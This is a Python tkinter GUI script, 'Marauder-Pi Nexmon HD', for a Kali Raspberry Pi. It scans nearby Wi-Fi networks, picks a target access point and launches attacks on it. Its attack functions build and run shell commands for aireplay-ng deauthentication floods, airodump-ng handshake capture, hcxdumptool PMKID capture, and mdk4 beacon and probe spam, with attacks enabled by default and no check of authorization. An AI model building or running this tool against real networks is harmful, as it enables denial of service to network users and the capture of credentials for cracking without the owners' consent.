#!/usr/bin/env python3
import tkinter as tk
import subprocess
import threading
import time
import os
import signal

# ============================================================
#   MARAUDER-PI – NEXMON HD EDITION (KALI + PI 5 + WLAN0)
#   Full HD GUI for scan & Wi-Fi attacks (monitor + injection)
# ============================================================

BG_MAIN   = "#000814"
BG_PANEL  = "#001d3d"
FG_TEXT   = "#caf0f8"
FG_ACCENT = "#00d9ff"
BTN_BG    = "#003566"
BTN_BG_HL = "#00509d"
BTN_FG    = "white"
BTN_WARN  = "#c1121f"

scan_running   = False
scan_thread    = None
attack_process = None

current_target = {
    "bssid": None,
    "channel": None,
    "essid": None,
}

wifi_iface    = None
ALLOW_ATTACKS = True  # set False for “demo/safe mode”


# ------------------------------------------------------------
# Utils
# ------------------------------------------------------------

def run_cmd(cmd, shell=False):
    try:
        out = subprocess.check_output(
            cmd,
            shell=shell,
            stderr=subprocess.STDOUT,
            text=True
        )
        return out.strip()
    except subprocess.CalledProcessError as e:
        return e.output.strip()
    except Exception as e:
        return f"Erreur: {e}"


def detect_wifi_interface():
    """Return first Wi-Fi interface, prefer wlan0."""
    out = run_cmd(["iw", "dev"])
    iface = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            iface = line.split()[1]
            break
    if iface:
        return iface

    for cand in ("wlan0", "wlan1"):
        res = run_cmd(["iwconfig", cand])
        if "no wireless extensions" not in res and "not found" not in res:
            return cand
    return None


def ensure_monitor_mode():
    global wifi_iface
    if not wifi_iface:
        wifi_iface = detect_wifi_interface()
    if not wifi_iface:
        log("[!] Aucune interface Wi-Fi pour le mode monitor.")
        return False

    log(f"[*] Passage de {wifi_iface} en mode monitor...")
    cmds = [
        f"sudo ip link set {wifi_iface} down",
        f"sudo iw dev {wifi_iface} set type monitor",
        f"sudo ip link set {wifi_iface} up",
    ]
    for c in cmds:
        log(f"$ {c}")
        log(run_cmd(c, shell=True))
    return True


def ensure_managed_mode():
    global wifi_iface
    if not wifi_iface:
        wifi_iface = detect_wifi_interface()
    if not wifi_iface:
        log("[!] Aucune interface Wi-Fi pour le mode managed.")
        return False

    log(f"[*] Passage de {wifi_iface} en mode managed...")
    cmds = [
        f"sudo ip link set {wifi_iface} down",
        f"sudo iw dev {wifi_iface} set type managed",
        f"sudo ip link set {wifi_iface} up",
    ]
    for c in cmds:
        log(f"$ {c}")
        log(run_cmd(c, shell=True))
    return True


# ------------------------------------------------------------
# GUI Setup (Full HD, fullscreen)
# ----------------------------------------------

# GUI Setup (Full HD, fullscreen forcé)
# ------------------------------------------------------------

root = tk.Tk()
root.title("Marauder-Pi Nexmon HD")

# Récupérer la taille réelle de l'écran
screen_w = root.winfo_screenwidth()
screen_h = root.winfo_screenheight()

# Forcer la fenêtre à cette taille
root.geometry(f"{screen_w}x{screen_h}+0+0")
root.configure(bg=BG_MAIN)
root.resizable(False, False)

# Fonctions de plein écran forcé
def go_fullscreen():
    root.overrideredirect(True)          # enlève bordures/barre de titre
    root.attributes("-fullscreen", True) # plein écran WM

def leave_fullscreen():
    root.overrideredirect(False)
    root.attributes("-fullscreen", False)

def toggle_fullscreen(event=None):
    if root.attributes("-fullscreen"):
        leave_fullscreen()
    else:
        go_fullscreen()

# Activer le fullscreen dès le départ
go_fullscreen()

# Raccourcis clavier
root.bind("<F11>", toggle_fullscreen)
root.bind("<Escape>", lambda e: leave_fullscreen())

nav_frame = tk.Frame(root, bg=BG_MAIN, height=60)

main_frame = tk.Frame(root, bg=BG_MAIN)
main_frame.pack(fill="both", expand=True)

content_frame = tk.Frame(main_frame, bg=BG_PANEL)
content_frame.pack(fill="both", expand=True, padx=20, pady=(10, 0))

console_frame = tk.Frame(root, bg=BG_PANEL, height=200)
console_frame.pack(fill="x", side="bottom", padx=10, pady=10)

pages = {}

# Console
output_text = tk.Text(
    console_frame,
    height=10,
    bg="black",
    fg=FG_ACCENT,
    insertbackground=FG_TEXT,
    bd=1,
    relief="sunken",
    font=("DejaVu Sans Mono", 10)
)
output_text.pack(side="left", fill="both", expand=True)

console_scroll = tk.Scrollbar(console_frame, orient="vertical", command=output_text.yview)
console_scroll.pack(side="right", fill="y")
output_text.configure(yscrollcommand=console_scroll.set)


def log(msg):
    ts = time.strftime("%H:%M:%S")
    output_text.insert("end", f"[{ts}] {msg}\n")
    output_text.see("end")


def show_page(name):
    for p in pages.values():
        p.pack_forget()
    frame = pages.get(name)
    if frame:
        frame.pack(fill="both", expand=True)
        if hasattr(frame, "on_show"):
            frame.on_show()


def styled_button(parent, text, command, width=18, height=2, danger=False):
    bg = BTN_WARN if danger else BTN_BG
    btn = tk.Button(
        parent,
        text=text,
        command=command,
        width=width,
        height=height,
        bg=bg,
        fg=BTN_FG,
        bd=2,
        relief="raised",
        activebackground=BTN_BG_HL,
        activeforeground=BTN_FG,
        font=("Helvetica", 11, "bold")
    )

    def on_enter(e):
        btn.configure(bg=BTN_BG_HL if not danger else "#e63946")

    def on_leave(e):
        btn.configure(bg=bg)

    btn.bind("<Enter>", on_enter)
    btn.bind("<Leave>", on_leave)
    return btn


# ------------------------------------------------------------
# Scan & Target
# ------------------------------------------------------------

import re

def parse_target(line: str):
    """
    Nettoie une ligne de console et extrait :
    - BSSID (AA:BB:CC:DD:EE:FF)
    - CH <num>
    - SSID <texte>
    """

    # 1) Nettoyage des caractères échappés
    clean = (
        line.replace("\\:", ":")
            .replace("\\ ", " ")
            .replace("\\", "")
            .strip()
    )

    # 2) Chercher un BSSID réel
    mac_regex = r"([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})"
    mac_match = re.search(mac_regex, clean)
    if not mac_match:
        return None

    bssid = mac_match.group(1)

    # 3) Chercher CHANNEL
    ch_regex = r"CH\s+(\d+)"
    ch_match = re.search(ch_regex, clean)
    if not ch_match:
        return None

    channel = ch_match.group(1)

    # 4) Chercher SSID
    if "SSID" in clean:
        ssid_part = clean.split("SSID", 1)[1].strip()
        essid = ssid_part
    else:
        essid = None

    return {
        "bssid": bssid,
        "channel": channel,
        "essid": essid,
    }
 
def select_current_line():
    """
    Lit la ligne sur laquelle se trouve la sélection (sel),
    ou celle du curseur si pas de sélection.
    """
    try:
        if output_text.tag_ranges("sel"):
            # Il y a une sélection → on prend la ligne où elle commence
            line = output_text.get("sel.first linestart", "sel.first lineend")
        else:
            # Pas de sélection → on tente avec le curseur (au cas où)
            line = output_text.get("insert linestart", "insert lineend")
    except Exception:
        log("[!] Impossible de lire la ligne courante ou sélectionnée.")
        return

    line = line.strip()
    if not line:
        log("[!] Ligne vide.")
        return

    tg = parse_target(line)
    if not tg:
        log("[!] Impossible d'extraire BSSID/CH/ESSID depuis cette ligne.")
        log(f"Ligne lue : {line}")
        return

    current_target.update(tg)
    log(f"[+] Target sélectionnée : {tg['bssid']}  CH:{tg['channel']}  ESSID:{tg['essid']}")

def format_nmcli_scan():
    """
    Retourne une liste de lignes déjà formatées :
    'AA:BB:CC:DD:EE:FF  CH 6  SSID MonWifi'
    à partir de la sortie nmcli.
    """
    res = run_cmd("nmcli -t -f BSSID,CHAN,SSID dev wifi", shell=True)
    if not res or "Error" in res or "UNKNOWN" in res:
        return None  # on fera un fallback iw/iwlist

    lines = []
    for raw in res.splitlines():
        raw = raw.strip()
        if not raw:
            continue

        parts = raw.split(":")
        # On s'attend à au moins : 6 (BSSID) + 1 (CHAN) + 1(SSID) = 8 segments
        if len(parts) < 8:
            continue

        # 6 premiers segments = BSSID
        bssid = ":".join(parts[0:6])
        chan  = parts[6] if parts[6] else "?"
        ssid  = ":".join(parts[7:]) if len(parts) > 7 else ""

        # On évite les lignes sans BSSID correct
        if bssid.count(":") != 5:
            continue

        lines.append(f"{bssid}  CH {chan}  SSID {ssid}")

    return lines


def do_single_scan():
    global wifi_iface
    output_text.delete("1.0", "end")

    if not wifi_iface:
        wifi_iface = detect_wifi_interface()
    if not wifi_iface:
        log("[!] Aucune interface Wi-Fi détectée.")
        return

    log("[*] Scan unique (nmcli)...")

    lines = format_nmcli_scan()
    if lines is None:
        # Fallback iw/iwlist si nmcli ne marche pas
        log("[!] nmcli indisponible ou erreur, fallback iw/iwlist.")
        res_raw = run_cmd(f"sudo iw dev {wifi_iface} scan", shell=True)
        if "command failed" in res_raw.lower():
            res_raw = run_cmd(f"sudo iwlist {wifi_iface} scan", shell=True)
        log(res_raw or "[!] Aucun réseau trouvé.")
        return

    if not lines:
        log("[!] Aucun réseau trouvé.")
    else:
        log("[*] Résultats (sélectionne une ligne puis clique Select Target):\n")
        log("\n".join(lines))

def start_live_scan():
    global wifi_iface, scan_running, scan_thread
    if scan_running:
        log("[!] Scan live déjà en cours.")
        return

    if not wifi_iface:
        wifi_iface = detect_wifi_interface()
    if not wifi_iface:
        log("[!] Aucune interface Wi-Fi détectée.")
        return

    scan_running = True

    def loop():
        while scan_running:
            output_text.delete("1.0", "end")
            log("[*] Scan live (nmcli)...")

            lines = format_nmcli_scan()
            if lines is None:
                log("[!] nmcli indisponible ou erreur, fallback iw/iwlist.")
                res_raw = run_cmd(f"sudo iw dev {wifi_iface} scan", shell=True)
                if "command failed" in res_raw.lower():
                    res_raw = run_cmd(f"sudo iwlist {wifi_iface} scan", shell=True)
                log(res_raw or "[!] Aucun réseau trouvé.")
            else:
                if not lines:
                    log("[!] Aucun réseau trouvé.")
                else:
                    log("[*] Résultats (sélectionne une ligne puis clique Select Target):\n")
                    log("\n".join(lines))

            for _ in range(5):
                if not scan_running:
                    return
                time.sleep(1)

    scan_thread = threading.Thread(target=loop, daemon=True)
    scan_thread.start()
 

def stop_live_scan():
    global scan_running
    if scan_running:
        scan_running = False
        log("[*] Scan live stoppé.")
    else:
        log("[!] Aucun scan live à stopper.")


# ------------------------------------------------------------
# Network & System info
# ------------------------------------------------------------

def show_network_info():
    output_text.delete("1.0", "end")
    log("[*] Infos réseau...")
    log(run_cmd("ip addr", shell=True))
    log("\n[iwconfig]\n" + run_cmd("iwconfig", shell=True))


def show_system_info():
    output_text.delete("1.0", "end")
    log("[*] Infos système...")

    if os.path.exists("/sys/class/thermal/thermal_zone0/temp"):
        with open("/sys/class/thermal/thermal_zone0/temp") as f:
            t = int(f.read().strip()) / 1000
            log(f"Temp CPU: {t:.1f}°C")

    log(run_cmd("uptime", shell=True))
    log("\n[free -h]\n" + run_cmd("free -h", shell=True))


# ------------------------------------------------------------
# Attack pages
# ------------------------------------------------------------

def build_attack_page(parent, title, cmd_builder):
    frame = tk.Frame(parent, bg=BG_PANEL)

    lbl_target = tk.Label(
        frame,
        text="Target: Aucune",
        bg=BG_PANEL,
        fg=FG_ACCENT,
        font=("Helvetica", 12, "bold")
    )
    lbl_target.pack(pady=10)

    lbl = tk.Label(
        frame,
        text=title,
        bg=BG_PANEL,
        fg=FG_TEXT,
        font=("Helvetica", 20, "bold")
    )
    lbl.pack(pady=10)

    btn_frame = tk.Frame(frame, bg=BG_PANEL)
    btn_frame.pack(pady=20)

    def refresh_target():
        if current_target["bssid"]:
            lbl_target.config(
                text=f"Target: {current_target['bssid']}  |  CH {current_target['channel']}  |  ESSID: {current_target['essid']}"
            )
        else:
            lbl_target.config(text="Target: Aucune")

    def start_attack():
        global attack_process
        output_text.delete("1.0", "end")
        refresh_target()

        if not ALLOW_ATTACKS:
            log("[X] Les attaques sont désactivées (ALLOW_ATTACKS=False).")
            return

        if not current_target["bssid"]:
            log("[!] Aucune target sélectionnée.")
            return

        if not wifi_iface:
            log("[!] Interface Wi-Fi inconnue.")
            return

        if not ensure_monitor_mode():
            return

        cmd = cmd_builder()
        log(f"[*] Lancement attaque : {cmd}")

        def run():
            global attack_process
            attack_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                preexec_fn=os.setsid,
            )
            for line in attack_process.stdout:
                log(line.strip())

        thr = threading.Thread(target=run, daemon=True)
        thr.start()

    def stop_attack():
        global attack_process
        if attack_process:
            log("[*] Arrêt de l’attaque...")
            try:
                os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
            except Exception:
                pass
            attack_process = None
            ensure_managed_mode()
        else:
            log("[!] Aucune attaque active.")

    btn_start = styled_button(btn_frame, "START", start_attack, width=16, height=2)
    btn_start.grid(row=0, column=0, padx=20, pady=10)

    btn_stop = styled_button(btn_frame, "STOP", stop_attack, width=16, height=2, danger=True)
    btn_stop.grid(row=0, column=1, padx=20, pady=10)

    btn_back = styled_button(
        frame,
        "Back to Attacks Menu",
        lambda: show_page("attacks_menu"),
        width=20,
        height=1
    )
    btn_back.pack(pady=10)

    def on_show():
        refresh_target()

    frame.on_show = on_show
    return frame


# ------------------------------------------------------------
# Attack commands
# ------------------------------------------------------------

def cmd_deauth():
    ch = current_target["channel"]
    bssid = current_target["bssid"]
    # On met l'interface sur le bon canal, puis on lance aireplay-ng
    return (
        f"sudo iw dev {wifi_iface} set channel {ch} && "
        f"sudo aireplay-ng --deauth 50 -a {bssid} {wifi_iface}"
    )

def cmd_handshake():
    fname = f"handshake-{int(time.time())}"
    return (
        f"sudo airodump-ng -c {current_target['channel']} "
        f"--bssid {current_target['bssid']} -w {fname} {wifi_iface}"
    )

def cmd_pmkid():
    fname = f"pmkid-{int(time.time())}.pcapng"
    return f"sudo hcxdumptool -i {wifi_iface} --enable_status=15 -o {fname}"

def cmd_beacon():
    return f"sudo mdk4 {wifi_iface} b -n MARAUDER-PI -a"

def cmd_probe():
    return f"sudo mdk4 {wifi_iface} p"


def build_attacks_menu(parent):
    frame = tk.Frame(parent, bg=BG_PANEL)

    lbl = tk.Label(
        frame,
        text="Attacks Menu",
        bg=BG_PANEL,
        fg=FG_TEXT,
        font=("Helvetica", 22, "bold")
    )
    lbl.pack(pady=20)

    grid = tk.Frame(frame, bg=BG_PANEL)
    grid.pack(pady=10)

    def add_attack_btn(text, page, r, c):
        btn = styled_button(
            grid,
            text,
            lambda: show_page(page),
            width=18,
            height=2
        )
        btn.grid(row=r, column=c, padx=20, pady=15)

    add_attack_btn("Deauth",    "attack_deauth",    0, 0)
    add_attack_btn("Handshake", "attack_handshake", 0, 1)
    add_attack_btn("PMKID",     "attack_pmkid",     1, 0)
    add_attack_btn("Beacon",    "attack_beacon",    1, 1)
    add_attack_btn("Probe",     "attack_probe",     2, 0)

    btn_back = styled_button(
        frame,
        "Back to Home",
        lambda: show_page("main"),
        width=18,
        height=1
    )
    btn_back.pack(pady=20)

    return frame


# Build attack pages
pages["attack_deauth"]    = build_attack_page(content_frame, "Deauth Attack",     cmd_deauth)
pages["attack_handshake"] = build_attack_page(content_frame, "Handshake Capture", cmd_handshake)
pages["attack_pmkid"]     = build_attack_page(content_frame, "PMKID Capture",     cmd_pmkid)
pages["attack_beacon"]    = build_attack_page(content_frame, "Beacon Spam",       cmd_beacon)
pages["attack_probe"]     = build_attack_page(content_frame, "Probe Spam",        cmd_probe)
pages["attacks_menu"]     = build_attacks_menu(content_frame)


# ------------------------------------------------------------
# Main pages
# ------------------------------------------------------------

def build_main_page(parent):
    frame = tk.Frame(parent, bg=BG_PANEL)

    title = tk.Label(
        frame,
        text="Marauder-Pi Nexmon HD",
        bg=BG_PANEL,
        fg=FG_TEXT,
        font=("Helvetica", 26, "bold")
    )
    title.pack(pady=(30, 5))

    subtitle = tk.Label(
        frame,
        text="Kali + Raspberry Pi 5 + Nexmon (wlan0)\nScan • Monitor • Attacks",
        bg=BG_PANEL,
        fg=FG_ACCENT,
        font=("Helvetica", 14),
        justify="center"
    )
    subtitle.pack(pady=(0, 30))

    grid = tk.Frame(frame, bg=BG_PANEL)
    grid.pack(pady=10)

    b_scan = styled_button(
        grid, "Scan", lambda: show_page("scan"), width=18, height=3
    )
    b_scan.grid(row=0, column=0, padx=30, pady=20)

    b_net = styled_button(
        grid, "Network", lambda: show_page("network"), width=18, height=3
    )
    b_net.grid(row=0, column=1, padx=30, pady=20)

    b_sys = styled_button(
        grid, "System", lambda: show_page("system"), width=18, height=3
    )
    b_sys.grid(row=1, column=0, padx=30, pady=20)

    b_atk = styled_button(
        grid, "Attacks", lambda: show_page("attacks_menu"), width=18, height=3
    )
    b_atk.grid(row=1, column=1, padx=30, pady=20)

    return frame


def build_scan_page(parent):
    frame = tk.Frame(parent, bg=BG_PANEL)

    lbl = tk.Label(
        frame,
        text="Wi-Fi Scan",
        bg=BG_PANEL,
        fg=FG_TEXT,
        font=("Helvetica", 22, "bold")
    )
    lbl.pack(pady=20)

    btn_row = tk.Frame(frame, bg=BG_PANEL)
    btn_row.pack(pady=10)

    b_single = styled_button(
        btn_row, "Single Scan", do_single_scan, width=18, height=2
    )
    b_single.grid(row=0, column=0, padx=15, pady=10)

    b_live_on = styled_button(
        btn_row, "Live Scan ON", start_live_scan, width=18, height=2
    )
    b_live_on.grid(row=0, column=1, padx=15, pady=10)

    b_live_off = styled_button(
        btn_row, "Live Scan OFF", stop_live_scan, width=18, height=2, danger=True
    )
    b_live_off.grid(row=1, column=0, padx=15, pady=10)

    b_sel = styled_button(
        btn_row, "Select Target\n(from console line)", select_current_line, width=18, height=2
    )
    b_sel.grid(row=1, column=1, padx=15, pady=10)

    b_back = styled_button(
        frame, "Back to Home", lambda: show_page("main"), width=18, height=1
    )
    b_back.pack(pady=20)

    return frame


def build_network_page(parent):
    frame = tk.Frame(parent, bg=BG_PANEL)

    lbl = tk.Label(
        frame,
        text="Network Tools",
        bg=BG_PANEL,
        fg=FG_TEXT,
        font=("Helvetica", 22, "bold")
    )
    lbl.pack(pady=20)

    btn_row = tk.Frame(frame, bg=BG_PANEL)
    btn_row.pack(pady=10)

    b_mon = styled_button(
        btn_row, "Monitor ON", ensure_monitor_mode, width=18, height=2
    )
    b_mon.grid(row=0, column=0, padx=20, pady=10)

    b_man = styled_button(
        btn_row, "Managed ON", ensure_managed_mode, width=18, height=2
    )
    b_man.grid(row=0, column=1, padx=20, pady=10)

    b_info = styled_button(
        btn_row, "Network Info", show_network_info, width=18, height=2
    )
    b_info.grid(row=1, column=0, columnspan=2, padx=20, pady=10)

    b_back = styled_button(
        frame, "Back to Home", lambda: show_page("main"), width=18, height=1
    )
    b_back.pack(pady=20)

    return frame


def build_system_page(parent):
    frame = tk.Frame(parent, bg=BG_PANEL)

    lbl = tk.Label(
        frame,
        text="System Info",
        bg=BG_PANEL,
        fg=FG_TEXT,
        font=("Helvetica", 22, "bold")
    )
    lbl.pack(pady=20)

    b_info = styled_button(
        frame, "Show Info", show_system_info, width=18, height=2
    )
    b_info.pack(pady=10)

    b_back = styled_button(
        frame, "Back to Home", lambda: show_page("main"), width=18, height=1
    )
    b_back.pack(pady=20)

    return frame


pages["main"]    = build_main_page(content_frame)
pages["scan"]    = build_scan_page(content_frame)
pages["network"] = build_network_page(content_frame)
pages["system"]  = build_system_page(content_frame)


# ------------------------------------------------------------
# Nav bar + shortcuts
# ------------------------------------------------------------

def nav_button(text, page=None, cmd=None):
    if cmd is None and page is not None:
        cmd = lambda: show_page(page)
    return tk.Button(
        nav_frame,
        text=text,
        width=10,
        bg=BTN_BG,
        fg=BTN_FG,
        bd=1,
        relief="raised",
        activebackground=BTN_BG_HL,
        activeforeground=BTN_FG,
        font=("Helvetica", 11, "bold"),
        command=cmd
    )

btn_home = nav_button("Home", "main")
btn_home.pack(side="left", padx=5, pady=10)

btn_scan = nav_button("Scan", "scan")
btn_scan.pack(side="left", padx=5, pady=10)

btn_net = nav_button("Net", "network")
btn_net.pack(side="left", padx=5, pady=10)

btn_sys = nav_button("Sys", "system")
btn_sys.pack(side="left", padx=5, pady=10)

btn_atk = nav_button("Atk", "attacks_menu")
btn_atk.pack(side="left", padx=5, pady=10)

btn_exit = nav_button("Exit", cmd=root.quit)
btn_exit.pack(side="right", padx=5, pady=10)


# Keyboard shortcuts for navigation
root.bind("<F1>", lambda e: show_page("main"))
root.bind("<F2>", lambda e: show_page("scan"))
root.bind("<F3>", lambda e: show_page("network"))
root.bind("<F4>", lambda e: show_page("system"))
root.bind("<F5>", lambda e: show_page("attacks_menu"))


# ------------------------------------------------------------
# Start
# ------------------------------------------------------------

show_page("main")

log("Marauder-Pi Nexmon HD démarré.")
wifi_iface = detect_wifi_interface()
if wifi_iface:
    log(f"Interface Wi-Fi détectée : {wifi_iface}")
else:
    log("[!] Aucune interface Wi-Fi détectée.")

root.mainloop()
